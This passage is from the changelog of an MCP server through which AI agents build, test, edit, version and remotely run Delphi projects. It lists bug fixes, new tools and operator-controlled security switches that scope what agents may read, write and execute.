  `delphi_build` defaults to Win32 - two different binaries). It says it, it
  accepts `platform=`, and it builds the one it runs. `discover` also names
  the only folder the sandbox lets a test write into.
- **`delphi_diagnostics` on a non-Delphi file answered "in progress, call
  again" forever**, and the note said the next call would bring the result.
- **`delphi_read` with the range backwards** answered with an empty body,
  which reads as "that stretch is empty".
- **`delphi_rename_symbol` returned 0-based lines** and told the reader to
  feed them to `delphi_changeset`, whose `atline` is 1-based - a guaranteed
  off-by-one, worst exactly where an anchor repeats. Both numbers now (`line`
  1-based, `line0` as the language server gave it).
- **`delphi_list`'s hidden-entry note blamed build folders for `.git`.** The
  count is split by reason now, and `dirs=true` stops hiding `.git` and the
  trash without counting them.
- **`delphi_symbols` answered `[]` for a `.txt`**, `delphi_hover` answered a
  canned hint for a line out of range, `delphi_definition` a bare `null`, and
  `delphi_projects` `{"total":0}` for a root that does not exist. All of them
  say what is actually wrong.
- **`delphi_test` accepted a configuration the project does not have** and
  built into a folder named after it.
- **`nobuild=true` reported a stale binary's numbers as today's** (200000
  passing tests out of a binary whose source no longer compiled). It says how
  old the binary is.
- **A report `kind` nobody knows was silently refiled as `bug`**, and
  `delphi_components` silently ignored `filter` when given `platform`. Both
  say so now.
- `delphi_git`'s own description and its error message listed 14 commands and
  forgot `switch`, `merge` and `stash` - which exist.
- `delphi_create kind=unit` answered `RECHAZADO: ruta invalida:` with an empty
  path when given `dir` instead of `project` (four calls to decode).
- `delphi_delete`'s answer contradicted itself three lines in ("moved to the
  trash" ... "the file is still on disk, delete it if you no longer want it").
- On a read-only server, a git write is refused for being read-only, not for
  the remote policy.

### Added
- `delphi_list` accepts `path=` as well as `root=` (and `delphi_projects`
  too): the spelling difference cost a call every time.
- Schema parameter names lost their trailing underscore (`classname_` →
  `classname`, `create_` → `create`): the schema said one thing and every
  description said another. All spellings keep working.
- `add-deployfile` writes the entry RELATIVE to the project, as the IDE does -
  an absolute one made the `.deployproj` unportable and stopped
  `remove-deployfile` from finding the server's own entries.


## [0.61.0-beta] - 2026-08-25

The other half of round 8: what the agents asked FOR, rather than what they
found broken.

### Added
- **`delphi_help`** - the map an agent arriving cold does not have. An agent
  said it plainly after doing a real job through nothing but this server:
  "no hay forma de preguntarle al servidor como se usa". `command=tasks`
  (the default) is the task -> tool table, one line each; `command=tool
  name=<tool>` is ONE tool in full without asking for `tools/list` (which
  returns all 41 at once, about 14k tokens); `command=conventions` is the
  ten rules that hold for every tool - virtual drives, the jail, anchored
  editing, the backups, encodings, compile-is-not-works, and that anything
  impossible through MCP is itself a finding worth reporting.
- **`delphi_changeset commit` says what it changed**, file by file with the
  line delta, the way `delphi_edit` always has. Two numbers after a
  16-operation batch left nobody able to tell WHICH files moved.
- **`delphi_projects` reports the git repository and the branch** each
  project sits in (read straight from `.git/HEAD`, no git process). An agent
  needs to know whether what it is about to edit is under version control,
  and on which branch, BEFORE it edits.
- **`delphi_build` names the FIRST error** (`firstError`) and says the rest
  may be its shadow. Measured in the field: one E2009 - a plain procedure
  assigned to a `TNotifyEvent` - produced seven E2250 "no overloaded version
  of Synchronize/Queue" in the same file, and the pile read like a threading
  problem it was not.

### Fixed
- **The mailbox notice broke JSON.** It was appended behind the answer, so
  while a message sat waiting, every JSON-returning tool answered something
  `json.loads()` could not parse - a syntax error out of nowhere, and only
  while there was mail. It now goes INSIDE the object as a `mailbox` field;
  only prose answers get it appended.
- `delphi_help` with a name that matches nothing lists every tool and says
  so, instead of claiming they all "look like" what was asked.


## [0.60.0-beta] - 2026-08-25

Field round 8. Three agents worked the server through nothing but MCP (a
security auditor, a contract prober, and one doing a real programming job)
and came back with 30+ findings. This release is those findings, fixed. New
battery `tests/test_round8.py` (57 checks) pins every one of them.

### Fixed - data loss and leaks
- **`delphi_upload` with no `chunkbase64` truncated an existing file to 0
  bytes and reported success.** The schema only demanded `path`, so a
  half-typed call opened the target with `fmCreate` and emptied it. Now
  refused, with the current size named. An upload that legitimately REPLACES
  a file now says so (`replaced`, `previousSize`) and where the recoverable
  copy is (`backup`) - the copy was already being made, and saying nothing
  about it is why an auditor concluded there was none.
- **An upload whose `sha256` did not match stayed published under its real
  name.** The bytes are known to be wrong: they are moved aside to
  `<file>.corrupto` and the answer says where.
- **The real drive letter leaked in every multi-line field.** By the time
  the mask runs the text is JSON, where a line break is the two characters
  `\` and `n` - so the letter `n` looked like the end of a word and the
  guard let `C:\Program Files...` through untouched. Single-line fields
  masked fine, which is why it survived this long: `errors[]` was virtual
  and `outputTail` was not.

### Fixed - answers that were not true
- **`delphi_config view` on a bare `.dpr`** answered with an empty
  framework, no platforms, no configurations and a cheerful
  `crossPlatform: yes`. It now resolves the sibling `.dproj` when there is
  one, and when there is not it returns the units it CAN read plus
  `hasDproj: false` and what it cannot know.
- **`$(BDS)` and friends never resolved** although the schema promised them:
  the search-path validator was reading the IDE's registry key instead of
  the full macro table, so the refusal recommended exactly what it had just
  refused.
- **`delphi_designer prop`** now gives the members of a **set**, not only of
  an enum, as its description always claimed.
- **`delphi_designer lint`** names the classes it does not know (it stayed
  silent, which read as "checked and fine") and no longer denounces
  `Viewport.*` or `Explicit*` - properties the IDE itself writes that
  classic RTTI never lists. Five false positives on real `.fmx` forms were
  telling agents to delete good properties.
- **`delphi_fetch`'s `maxbytes`** documented a cap of 8 MB while anything
  over 4 MB came back as a link with no inline chunk; the parameter now
  describes the real rule and the answer carries `inline: false`.
- **`vault_read`'s footer** said "lines 1..N" whatever the offset was, so a
  reader asking for 20..21 was told it had seen 1..21 and stopped asking.
  An offset past the end is now explained instead of answering with a bare
  header.
- The `target=Deploy` both `add-deployfile` and `view` recommended needs an
  IDE connection profile and fails with "Missing profile name" without one,
  Win32 included. Said plainly now, pointing at `delphi_paclient`.

### Fixed - dangerous or dead ends
- **`delphi_create` is atomic.** A collision on the third file left an
  orphan `.dpr` pointing at another project's unit, with no `.dproj`, and
  the retry refused with "ya existe un proyecto": a dead end. Every target
  is checked before anything is written.
- **Unit names**: reserved words (`begin` - E2029 plus 16 cascading errors)
  and RTL unit names (`System` - hijacks the compiler's own) are refused
  with the reason.
- **A form of the wrong framework** is refused instead of landing an FMX
  form and its `Application.CreateForm` in a `.dpr` that uses `Vcl.Forms`.
- **`delphi_styles set`** validates the value against the streaming grammar
  instead of writing anything at all and leaving the `.style` unreadable
  until `build` failed. `prop=StyleName` is a rename: refused when the name
  is taken (it was silently producing duplicates), announced as a rename
  when clean.
- **`remove-platform`** is idempotent (it was taking a backup of a no-op)
  and refuses to disable the last enabled platform.
- **A missing required parameter** is a refusal with the parameter's name,
  not `Error executing tool: Invalid characters in path`.

### Added
- **`delphi_changeset` validates against the BATCH, not just the disk.**
  Staging `delete X` + `create X` - the natural way to rewrite a unit - was
  refused because the delete had not run yet. A changeset is a plan, so the
  plan decides.
- **`delphi_changeset command=unstage`** (`n` = the number `preview` prints,
  0 = the last one): one mistyped anchor no longer means rolling the whole
  batch back and staging it all again.
- **`delphi_create kind=unit content=...`** creates the unit WITH its source
  and registers it in one call. The `unit X;` must match the file name and
  it must end in `end.` - registering `UFoo.pas` whose source says
  `unit UBar` is a lie the compiler finds much later.
- The mailbox notice **no longer names another agent's box**. Three agents
  reported reading `MENSAJES PENDIENTES (buzon: dsh)` on nearly every
  answer, being unable to do anything about it, and learning another id for
  free. Mail for everyone is announced as theirs; mail for a named agent is
  counted, never named.
- `delphi_build` finds the `lib<Project>.so` Android and iOS actually
  produce, so `output` is no longer absent on those platforms.
- `vault_search` refuses a `target` it does not know instead of silently
  falling back to `files` (`target=contents` answered with note NAMES and
  the caller concluded the vault was empty inside).


## [0.59.0-beta] - 2026-08-25

The biggest wall left, named independently by both reviews: an agent could
write code and never learn whether it WORKS.

### Added
- **`delphi_test`** - `discover path=<folder>` lists the test projects
  underneath (a `.dpr` using DUnitX, or a console one whose name says
  test/spec); `run project=<test .dproj>` builds it and runs it, answering
  **structured**: total / passed / failed, the failing lines, exitCode,
  duration and a bounded tail. Two dialects understood (DUnitX's summary and
  the plain PASS/FAIL + ExitCode of a hand-written runner), and the verdict
  says which one spoke (`verdictFrom`) instead of guessing. A suite that does
  not compile answers `build-failed` with the compiler errors - it never runs
  a stale binary.
- **`[Security] AllowTests`** (env `DELPHI_MCP_ALLOW_TESTS`) - its own
  switch, separate from `AllowRun` on purpose: allowing a test suite to run
  is a narrower decision than allowing arbitrary binaries (`AllowRun` implies
  it). The binary is built here, comes from a project of the jail and runs in
  the same low-integrity sandbox with a timeout. `discover` works without it.
- `tests/test_delphi_test.py` (19 checks): a green suite and a red one, the
  switch refusing `run` while `discover` still answers, a non-test project
  refused, and a suite that does not compile.


## [0.58.0-beta] - 2026-08-25

Four fixes from a full session run by an agent that worked ONLY through the
MCP (72 calls, no local filesystem, no shell) - the dogfooding the review
asked for, done properly.

### Fixed
- **`delphi_rename_symbol` left the definition out of `changes`** - and
  `changes` is the contract an agent stages. The implementation header (the
  very line the `definition` field points at) is not a "reference", so it
  never came in the list: applying exactly what the tool listed broke the
  unit with `E2065 Unsatisfied forward declaration`. The agent measured it,
  it was not a guess. Now the definition line is always there (with its
  text and `kind: definition`), plus a warning when the header is qualified
  (`TClass.Method`), where only the method half may change.
- **Every tool advertised ALL its parameters as `required`** (a vendor
  default: required unless marked `[Optional]`, and nothing was). The server
  happily accepts partial calls, so the schema was lying - and a client that
  validates before sending could not call anything. Inverted (`[Required]`
  marks the few that are), and marked across the 39 tools.
- **`delphi_search` returned the line trimmed and no column**, so the hit
  could not be turned into a `line:character` for the LSP tools without an
  extra `delphi_read` just to count spaces. Now the text is verbatim and the
  hit carries `line0`/`character0` ready to chain.
- **The LSP family spoke two dialects**: `definition` answered a
  `file:///srvd%3A/...` URL with 0-based lines while `hover` printed 1-based
  ones. Every location now also carries `path` (the format the rest of the
  server uses) and `line1` next to the LSP `line`.


## [0.57.0-beta] - 2026-08-25

First fix out of the deep review (`docs/REVIEW-2026-08.md`): an agent could
CREATE a branch and never move to it, so it could not work the way a
programmer does - branch per task, commit, back to main.

### Added
- **`delphi_git switch`** (`args=<branch>`, `create=true` for a new one),
  **`merge`** (always `--ff-only`: a merge that would need a commit, or
  conflict, is REFUSED rather than left half-done - that is a person's call)
  and **`stash`** (`push`/`pop`/`list`; `drop` deliberately absent, it
  destroys). The file-restoring forms of `checkout` stay out: discarding
  work needs its own command with its own words, not a flag.
- `tests/test_git_branches.py` (15 checks): branch per task, work, switch
  back, ff-only merge, a divergent merge refused, stash round-trip.


## [0.56.0-beta] - 2026-08-25

Remote execution CLOSED end to end: an agent with no route to the target
machine started the runner there and ran the app it had deployed, all
through MCP. Measured against the real Zorin box, not a stub.

### Added
- **`delphi_paserver command=start-runner`** - starts the runner on the
  target, no shell needed there. The discovery that makes it possible:
  paclient's `--put` FLAGS are not permissions, they are actions - flag 5
  makes PAServer EXECUTE the file with `/bin/sh` on the target and flag 3
  executes it directly. So the server sends a small POSIX launcher (LF, no
  BOM) that starts the runner with `setsid` (surviving PAServer's cleanup)
  and reports what it saw. Gated by `AllowRemoteRun` exactly like remote-run:
  starting the runner IS enabling execution.

### Fixed
- **`install-runner` shipped the runner with flag 5**, so PAServer tried to
  run a Python file through `/bin/sh` and the copy did not stay. Now flag 0
  (plain data).
- **`remote-run` doubled the `<user>-<profile>` segment**: the runner lives
  in `<scratch>/<user>-<profile>/_mcp-runner`, so ITS root already IS the
  profile folder and the path must be just `<Project>/<Project>`. The test
  battery had encoded the same wrong assumption; fixture corrected against
  the real layout.


## [0.55.0-beta] - 2026-08-25

### Fixed
- **An `Mcp-Session-Id` this process never issued is now refused with 404**
  (`[local change]` in the vendored HTTP server, which echoed whatever the
  client sent and never checked it). Reported by an agent that had just
  taught its client to PERSIST the session: after a server restart the
  stored id is dead, and silently accepting it leaves the client working
  against a ghost. An `initialize` carrying a stale id still passes - that
  request IS the fix. Auth was never affected (the Bearer token decides
  everything); this is protocol correctness, and it is what lets a
  persistent-session client detect a restart.


## [0.54.0-beta] - 2026-08-24

Four field frictions from an agent using the new tools on a real change (16
edits over 2 files of a live FMX project).

### Fixed
- **`delphi_changeset commit` reported "0 operaciones aplicadas" having
  applied 16**: the owning dictionary FREES the changeset on `Remove`, and
  the message read `C.Ops.Count` afterwards. Counts are captured before.
  Same root cause as the "fallo la operacion 2 de 0" in rollbacks.
- **`atline` is now rebased against what earlier operations of the same
  changeset did to that file**: the preview resolves against the original
  text and the commit applies against the mutated one, so a batch that
  ADDED lines broke the pinned line of a later operation.
- **`delphi_designer lint` no longer warns about `Left`/`Top`** of
  non-visual components: the form designer writes them in every form
  carrying a TImageList/TPopupMenu and no class publishes them (6 of 6
  warnings on a real form were this).

### Added
- **`delphi_changeset kind=delete-line`** (`atline` required, `old`
  optional) - the only way to remove a BLANK line, which has no usable
  anchor; exactly what a cleanup leaves behind. `kind=delete` keeps meaning
  the WHOLE FILE, now said so in the schema.
- Changeset edits on NON-Delphi files (`.md`, `.json`, `.ini`...) now go
  through the plain-text engine instead of being refused: a transaction that
  could not touch a doc next to the code was half a transaction.


## [0.53.2-beta] - 2026-08-24

### Fixed
- `delphi_rename_symbol`: the `changes` list is capped at 100 entries with
  `changesTruncated` (a symbol with hundreds of uses must not flood a small
  client's context; `occurrences`/`files` carry the full truth).


## [0.53.1-beta] - 2026-08-24

### Fixed
- **`delphi_workspace` cost every session ~3.5k tokens**: `readableExtra`
  listed the ~145 registered library folders one by one, on the call every
  agent makes FIRST. Compressed to the unique top-level trees with a
  subfolder counter (measured while hunting what filled a local model's
  context; the other thief is the tools/list catalog itself - ~14k tokens
  per reconnect - so the operator's deploy policy is now batch-and-notify
  instead of one reconnect per version).


## [0.53.0-beta] - 2026-08-24

Semantic rename, PREVIEW ONLY - the refactoring DelphiLSP 37 does not
provide, built from the pieces this server already trusts, with a rule
strict on purpose.

### Added
- **`delphi_rename_symbol`** (path + 0-based line/character + `newname`,
  `mode=preview`) - lists every CONFIRMED occurrence (each one re-resolved
  against the same definition), the files touched, and whether the rename is
  APPLICABLE. One single unverified reference, a hit in a `.dfm`/`.fmx`
  (form bindings), a hit inside a string literal (FindComponent/RTTI/
  StyleLookup by name), a definition outside the workspace (RTL/components),
  a reserved word or a collision with the new name = `applicable=false` with
  the reasons. `mode=apply` is refused for now: it will arrive over
  `delphi_changeset` once preview is field-validated; meanwhile an
  applicable preview IS the change list to stage there yourself.
- `tests/test_rename.py` (12 checks): the acceptance criteria as tests,
  including "the tool never writes".

### Fixed
- The string-literal scan is a LINEAR walk: the obvious `'(...|'')*'` regex
  backtracked catastrophically on a 1 MB RTL unit (stack overflow, found by
  the battery's own RTL case). A definition outside the jail is never
  scanned further at all.


## [0.52.0-beta] - 2026-08-24

The designer, structured (phase 1: read + lint) - the roadmap step ahead of
rename, on the generated RTTI tables the post-edit lint already used.

### Added
- **`delphi_designer`** - `info class=TButton` (every property the framework
  REALLY publishes, kind and type, events apart; `filter` narrows), `prop
  class=TPanel prop=Align` (one property in detail, with the legal enum/set
  members and the runtime class of class-typed properties), `tree
  path=<.dfm|.fmx>` (the component tree: name, class, line), `get ...
  component=<Name>` (that component's block verbatim), `lint path=...` (the
  designer lint on demand: properties the class does not publish, enum
  values that do not exist; an UNKNOWN class is deliberately not a warning -
  third-party components are not in the tables and are legitimate). Binary
  TPF0 designers refused, as everywhere. Editing commands are phase 2 and
  will go through `delphi_changeset`.
- `tests/test_designer.py` (20 checks).


## [0.51.0-beta] - 2026-08-24

Multi-file transactions - the foundation piece of the adopted roadmap
(changeset -> designer -> rename), and the close of a real debt: the project
tools could only REPORT a partial change when one file of a batch failed.

### Added
- **`delphi_changeset`** - `begin` -> `stage` (edit/create/delete/move, one
  per call, nothing touches disk) -> `preview` (resolves every anchor and
  fingerprints every file the batch will touch, SHA-256) -> `commit`
  (fingerprints re-checked: a file changed since preview refuses the WHOLE
  batch; byte snapshots first, then apply in order; ANY failure restores
  every file byte-exact and names the failing operation). `rollback`
  discards; `status` lists. Edits use the delphi_edit contract. Changesets
  expire after 30 minutes unused; at most 8 open.
- `tests/test_changeset.py` (22 checks) - the external review's acceptance
  criteria as tests: batch of 10 with a failure at op 7 -> ZERO net changes;
  FILE_CHANGED between preview and commit -> refused untouched; CP1252+CRLF
  intact; commit without a clean preview blocked.


## [0.50.0] - 2026-08-24 (docs/tests only, no server change)

Doc hygiene, from an external technical review that caught the README still
claiming 29/28 tools while the server registers 36.

### Fixed
- README counts corrected (36 tools, 31 core, 24 non-LSP core) and the
  non-LSP tool list completed (`delphi_components`, `delphi_styles`,
  `delphi_messages` were missing).

### Added
- **`docs/CAPABILITIES.json`** - capability manifest generated from the LIVE
  `tools/list` by `scripts/gen-capabilities.py` (run it after each release).
- **`tests/test_docs_consistency.py`** (16 checks) - every figure the README
  claims, every `### tool` section of TOOLS.md and the manifest are compared
  against the real `tools/list`; drift is now a test failure. It already
  caught its own first bug: with a read-only vault only 2 of the 5 vault
  tools register, so the full-surface run needs the vault writable.


## [0.49.0-beta] - 2026-08-24

Two scope controls, both from an agent's security review of its own reach.

### Added
- **`[Security] RemoteRunProjects`** - semicolon list of project names (or
  full `.dproj` paths) `remote-run` may execute on a target. Empty (the
  default) keeps the current behaviour, any project of the jail; with several
  projects of different trust it stops an agent working on A from running the
  deployed binary of B.
- **`[Security] LibraryZone`** (env `DELPHI_MCP_LIBRARY_ZONE`) - `0` cuts the
  read-only library zone: reads are then confined to the workspace roots,
  exactly like writes. Default `1` (reading the RTL and the installed
  components is what lets an agent check an API instead of guessing), but the
  zone GROWS by itself with every component or SDK installed, so the operator
  now has a way to say no. `delphi_workspace` announces the off state and
  returns an empty `readableExtra`.


## [0.48.1-beta] - 2026-08-24

### Added
- **`[Security] AllowRemoteRun`** (env `DELPHI_MCP_ALLOW_REMOTE_RUN`) - the
  operator's switch for `remote-run`, OFF by default and INDEPENDENT of
  `AllowRun`: running on a target is not running here, and whoever runs this
  server does not necessarily own that machine. Two locks in series now: this
  switch on the server side, and the runner somebody has to launch on the
  target. `install-runner` does not need it - copying a script executes
  nothing. Documented in `settings.example.ini`.


## [0.48.0-beta] - 2026-08-24

### Changed - BREAKING (remote-run, one day old)
- **`remote-run` no longer takes a remote path: it takes the PROJECT.** The
  rule is now "the only thing that runs on the target is the program that
  project deployed" (operator's call): the server derives
  `<user>-<profile>/<Project>/<Project>` itself, so nothing else of the
  remote machine - not even another file of the scratch dir - is reachable.
  `exe` survives as an OPTIONAL plain file name of that same deploy folder
  (no separators, no `..`) for a deploy with more than one binary.
- **The runner enforces the same rule on its side**: the job carries the
  allowed folder and the runner refuses anything resolving outside it
  (symlinks included), and refuses anything that is not a NATIVE executable
  (ELF / Mach-O / PE magic) - a script would turn "run the deployed program"
  into "run any interpreter with any arguments".
- `tests/test_remoterun.py`: 15 checks (script of the same folder refused,
  path separators refused, project outside the jail refused).


## [0.47.2-beta] - 2026-08-24

### Fixed
- **`remote-run` said "no runner installed" when the runner WAS installed and
  simply not launched** (reported by an agent that had just run
  `install-runner`). On the timeout path the server now asks the target
  whether the script is there and answers accordingly, with the launch line;
  the result carries `runnerInstalled` so the two cases are told apart.


## [0.47.1-beta] - 2026-08-24

### Added
- **`delphi_paserver command=install-runner name=<profile>`** - copies
  `runner/mcp-runner.py` to the target's `_mcp-runner/` through paclient, and
  answers with the single line to launch it there. Field 2026-08-24: the
  agent that needs `remote-run` (a container with no route to the target) has
  no other way to put the file on that machine; installing it by hand was
  never going to be its job.


## [0.47.0-beta] - 2026-08-24

Remote RUN: an agent that is not sitting on the target machine can now
execute what it just deployed there.

### Added
- **`delphi_paserver command=remote-run`** - runs a program on the machine
  of a PAServer profile and returns its exit code and output. `paclient.exe`
  has no exec operation (its whole surface is file copy, codesign and
  Android packaging - launching processes is the IDE<->PAServer private
  protocol), so the run travels as a job file: the server `--put`s the order
  in `<scratch>/_mcp-runner/jobs/`, the target's runner executes it and
  writes the result, the server `--get`s it. Parameters: `name` (profile),
  `exe` (relative to the scratch dir or absolute), `args`, `timeoutms`.
- **`runner/mcp-runner.py`** - the target half, installed once inside
  PAServer's scratch dir. It is the OPT-IN: no runner, no remote execution
  (the call times out saying exactly that). It only executes binaries inside
  the scratch dir - the deploy zone - never the rest of the machine.
- `tests/test_remoterun.py` (7 checks) with `tests/paclient_stub.py`: the
  whole cycle without a real PAServer.


## [0.46.3-beta] - 2026-08-24

A 5-probes-per-tool sweep over all 36 tools (180 probes): four fixes.

### Fixed
- **`delphi_projects` ignored the environment jail**: it re-read
  `settings.ini` itself, so a server jailed via `DELPHI_MCP_ROOTS` answered
  "no workspace roots configured" while every other tool was correctly
  confined. It now asks the jail (one source of truth).
- **`delphi_read` swallowed binaries**: an `.exe` came back as 9 MB of
  CP1252 mojibake. A NUL byte in the first 4 KB now refuses with a pointer
  to `delphi_fetch`.
- **`git commit` in a fresh repo** died with "Author identity unknown"
  (exit 128) and no way out: the answer now names the whitelisted fix
  (`command=config args=user.name/user.email`).
- `vault_read linecount` accepted as alias of `limit`.


## [0.46.2-beta] - 2026-08-23

Two bugs found by working a real project through the MCP alone.

### Fixed
- **`add-unit` / `remove-unit` re-indented the whole `uses` clause of the
  `.dpr`** to four spaces (the indent was applied twice): a 40-line cosmetic
  diff on every registration. The clause keeps the indent it already had.
- **`delphi_references` never scanned sibling folders**: units living next to
  the project folder (`SharedSource\` beside `codigofuente\`) were not
  walked, so a symbol used twice in its own file reported zero references.
  The scan now covers the project folder, the file's own folder and the
  folder of every unit the `.dpr` lists (inside the read zone).


## [0.46.1-beta] - 2026-08-23

The rest of the agent-side frictions.

### Added
- **Parameter aliases at the gate** - the same idea was spelled `query` /
  `pattern` / `filter` across tools and each spelling learned on one tool
  cost an "Unknown parameter" on the next. Accepted now, only where the tool
  does not already declare the name with another meaning: `vault_search
  query|filter` → `pattern`, `delphi_list filter|mask` → `pattern`,
  `delphi_components pattern|query` → `filter`, `delphi_read
  startline|endline` → `fromline|toline`, `delphi_search text` → `query`.
  The declared name always wins; an alias sent next to it is dropped.
- **`delphi_search root=<file>`** - one file (a `.dproj`, `.dpr`, `.inc`,
  `.xml`) is searched in a single call; a 1900-line `.dproj` used to cost
  five `delphi_read` calls.
- **`delphi_list` refuses `{a,b}`** with the `;` alternative instead of
  returning an empty list.
- **Tray: `logsctual.log`** - the live tail of the block not yet
  persisted (the memo reaches a file every `LinesPerFile` lines; a server
  stopped from outside lost hours of log). Removed when the block is saved.

### Fixed
- Vault backups: one folder per WORK session (a new stamp after 4 h without
  writes), not per server run - a tray lives for days.
- Vendor logger flushes per line when file logging is on.


## [0.46.0-beta] - 2026-08-23

Seven frictions measured in one sitting by running the agent's closing
tasks with nothing but the MCP (and the agent's own reports), fixed where
the fix was clear.

### Fixed
- **`delphi_styles lint` read comments**: a `StyleLookup` mentioned in a
  `//`, `{ }` or `(* *)` comment of a `.pas` became a "lookup without
  style" (a documented non-issue of a real project was reported as a
  finding). Comments and directives are now blanked before scanning.
- **Non-Windows builds declared no `output`**: a Linux64 build leaves an ELF
  without extension (macOS too); `delphi_build` now declares it (plus `.so`
  / `.dylib`), as it already did for `.exe`/`.dll`/`.bpl`.
- **`initialize` over SSE omitted the `Mcp-Session-Id` header** (the id was
  only in `result.sessionId`); a client strict with the streamable-HTTP
  spec found no session. The header is emitted on both paths now.

### Added
- **`delphi_styles command=delete`** - removes a whole style by StyleName
  (the `__delphi-patch` copy is the way back). Cleaning a test clone used
  to take a `delphi_delete` of the file plus a `delphi_move` of the backup.
- **`deployNote` warns that the PAServer scratch folder is rewritten** on
  every deploy - whatever the app stored next to its binary (data folder,
  local database, key file) goes with it.
- **`vault_search` with no hits on names** now says it only looked at note
  names and points at `target=content`.


## [0.45.0-beta] - 2026-08-23

The "new platform" loop, closed from the agent's own report: a Linux64
build of a fat FMX app took two failed builds per component to locate the
Source folders that only Windows had registered.

### Added
- **`delphi_build` → `missingUnits`** - when a build fails with F2613
  (`Unit 'X' not found`) or F1026, the result names each missing unit and
  the folders of the library zone (RAD Studio installs, registered
  components, GetIt catalog) where its `.pas` lives, shortest first, plus
  the `delphi_config add-searchpath` to run. No candidates = the component
  is not installed or brings no source for that platform.
- **`delphi_components platform=X`** - the IDE's Library Search Path for
  ONE platform, expanded to real folders, and the component install roots
  the other platforms register that this one does not (with who has them):
  the matrix to walk before porting a project to Linux64/Android/macOS.


## [0.44.0-beta] - 2026-08-23

The way back of `delphi_report`.

### Added
- **`delphi_messages`** - the operator's mailbox. A Markdown file dropped
  in `messages\<agent>\` (one agent, the id it gives `delphi_report`) or in
  `messages\` (everyone) next to the server exe is delivered by
  `command=read` once (moved to `messages\_entregados\`); `check` lists
  what waits. MCP clients have no usable push, so while a message waits
  EVERY tool answer ends with a `MENSAJES PENDIENTES` line. A broadcast is
  consumed by the first agent that reads it: with several agents, drop one
  file per agent folder. `scripts\Enviar-Mensaje.ps1` writes one from the
  operator's shell.

## [0.43.1-beta] - 2026-08-23

### Fixed
- `delphi_diagnostics`: after a lint was delivered, an identical second
  call waited forever (the in-progress mark was never cleared).


## [0.43.0-beta] - 2026-08-22

FMX styles as a first-class thing for a remote agent. Measured on a real
pipeline (one text master `.style`, a `Tokens.ini`, an `.rc`, three themes):
the agent could read and line-edit the files but not search them, verify
them, or regenerate the binaries the app embeds.

### Added
- **`delphi_styles`** - `view` (the styles of a text `.style`: StyleName,
  class, lines, parts), `get` (one style or a part of it), `set` (one
  property of a style or of a part, by StyleName - never by line; add,
  change or `delete`), `clone` (a new style from an existing one, the way
  to add a variant), `lint` (duplicated StyleNames, `StyleLookup` values of
  the project's `.fmx`/`.pas` that no style defines - the platform default
  style counts -, design tokens missing in a theme of a `*Tokens.ini`, `.rc`
  entries whose file is missing) and `build` (every text `.style` of the
  folder to `.bin.style`, then the folder's `.rc` to `.res` with brcc32).
  Binary styles are refused for editing. `set`/`clone`/`build` are refused
  in read-only mode. Parser tolerates collections (`<item...end>`) and
  binary blocks.
- **`DelphiStyleConvert.exe`** - a small helper shipped next to the server
  (FMX stays out of the service exe): text<->binary conversion and the
  extraction of the Windows platform default style names (cached once).
- **`delphi_search pattern`** - one file mask (`*.style`, `*.ini`, `*.md`,
  `*.rc`) to search files outside the Delphi set.


## [0.42.3-beta] - 2026-08-22

Field report from the DSH agent: `target=Deploy` to Linux said success and
shipped nothing.

### Fixed
- **IDE manifests with an empty platform group**: the Deployment Manager
  writes `<ItemGroup Condition="'$(Platform)'=='Linux64'"/>` for a platform
  the project was never deployed to from the IDE; msbuild then deploys no
  file and still succeeds. The project output (Debug and Release, Include
  following the project's real `DCC_ExeOutput`) is now added to such a
  group, in the IDE's shape; `deployManifest` says so.
- `deployNote` names the real target folder (`<windows user>-<profile>/`),
  reports `deployedFiles` when the run shipped something, and surfaces the
  `Local file "" not found` manifest warning as `deployWarning`.


## [0.42.2-beta] - 2026-08-22

Field report from the DSH agent: `delphi_diagnostics` timed out on a
714-line unit. Three causes, all measured on that unit (2.2 s now):

### Fixed
- **Units in a sibling folder of the project** (`SharedSource\` next to
  `codigofuente\`) were linted without settings - the `.dproj` lookup only
  walked up the tree - so the LSP never published. The lookup now also
  finds the `.dproj` one level down that references the unit.
- **GetIt packages were missing from the fabricated settings**: the IDE's
  library path entries under `$(BDSCatalogRepository)` were dropped as
  unexpanded macros (LockBox, Abbrevia, ICS... -> `F2063 could not compile
  used unit`). The fabricator now expands the IDE's environment table.
- Fabricated settings carry a generation in the cache name, so a rule
  change invalidates old caches.
- `delphi_diagnostics` answers within 40 s: a slow lint keeps running and
  the next call on the same unchanged file returns its result (the lint is
  no longer restarted on retry).


## [0.42.1-beta] - 2026-08-22

Code review of 0.42.0 (8 angles, 10 confirmed findings), all applied.

### Fixed
- **Jail**: projects found in the unit's parent folder are now vetted with
  the write jail before `delphi_delete`/`delphi_move` touch them; a denied
  project is reported and left alone.
- **Uses-clause parser** understands `//`, `(* *)` and `{ }` comments and
  compiler directives: entries keep their leading `{$IFDEF}`/comment when
  dropped (directives stay balanced), a comma/`;`/apostrophe inside a
  comment no longer splits or ends the clause, and the `uses` keyword is
  looked up after `program X;`, never inside a header comment.
- **Designer kind**: unit-qualified ancestors (`Vcl.Forms.TFrame`) are
  recognised; ancestors declared in the same unit are followed up the chain;
  a base living elsewhere is classified by NAME SUFFIX (`...Frame`,
  `...DataModule`), never by substring (`TMainframeForm` is a form).
- **CreateForm placement**: right before `Application.Run`, like the IDE -
  never after a `CreateForm` that may sit inside a conditional block.
- **Out-of-tree units** get a `..\` relative include (same drive), the
  IDE's form, instead of an absolute path.
- **add-unit on a unit already listed from another path** refreshes the
  existing `<DCCReference>` instead of inserting a second one.
- **remove-unit** drops `CreateForm` by CLASS when the `.pas` is readable;
  the form-variable fallback is used only when the class is unknown.
- **delete/move** report the project and designer changes already applied
  when a later step fails; per-project errors are captured, not fatal.
- `view`/`ProjectsUsingUnit` sweep the `.dproj` once (dictionary) instead
  of one regex pass per unit; the read-only scan skips the `.dproj`.
- ASCII-only rejection text (em-dash removed); scaffold failure message
  names the pair as `X.pas/.dfm`.


## [0.42.0-beta] - 2026-08-22

Project membership, done by the server. Until now the agent could scaffold
a project or a form, but a plain unit was a bare file, a new form never
reached the `.dproj`, and deleting or renaming a unit left its `uses`,
`CreateForm` and `<DCCReference>` orphaned - the agent patched the `.dpr`
by hand. Now the IDE's "Add to project" / "Remove from project" / rename
are one operation, shared by every tool that touches a unit.

### Added
- **`delphi_config add-unit` / `remove-unit`**: register an EXISTING
  `.pas` in the project (uses of the `.dpr` with the `{Form}` /
  `{DM: TDataModule}` / `{Frame: TFrame}` comment, `Application.CreateForm`
  for forms and data modules - never frames -, `<DCCReference>` with
  `Form`/`FormType`/`DesignClass` in the `.dproj`, the IDE's exact shape)
